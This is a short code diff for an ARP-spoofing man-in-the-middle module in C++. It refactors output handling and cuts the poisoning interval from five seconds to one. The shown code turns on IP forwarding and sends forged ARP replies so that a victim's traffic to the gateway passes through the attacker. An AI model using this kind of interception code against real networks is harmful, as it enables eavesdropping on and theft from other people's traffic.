@@ -1,7 +1,7 @@
 #include "Mitm.hh"
 
-Mitm::Mitm(Core &core, const std::string &victimIp, const std::string &gatewayIp)
-    : AModule(core, "Mitm"), _run(false)
+Mitm::Mitm(Core &core, std::ostream *out, const std::string &victimIp, const std::string &gatewayIp)
+    : AModule(core, "Mitm", out), _run(false)
 {
     _gateway.ip(IPv4Address(gatewayIp));
     _gateway.mac(_core.arpRequest(_gateway.ip()));
@@ -12,7 +12,7 @@ Mitm::Mitm(Core &core, const std::string &victimIp, const std::string &gatewayIp
     // Enable ip forwarding
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
 
-    std::cout << "Start MITM : [" << _gateway.ip() << "] <---> [" << _victim.ip() << "]" << std::endl;
+    *_out << "Start MITM : [" << _gateway.ip() << "] <---> [" << _victim.ip() << "]";
 }
 
 void Mitm::poison(void)
@@ -26,7 +26,7 @@ void Mitm::poison(void)
         // Tell victim thats _gateway.ip() is _attackerMac
         _core.arpReply(_gateway.ip(), _core.mac(), _victim.ip(), _victim.mac());
         // Don't need to spam
-        sleep(5);
+        sleep(1);
     }
 }
 
@@ -39,7 +39,6 @@ void Mitm::start(void)
 
 void Mitm::stop(void)
 {
-    std::cout << "Stopping MITM.." << std::endl;
     _run = false;
 
     // Disable ip forward
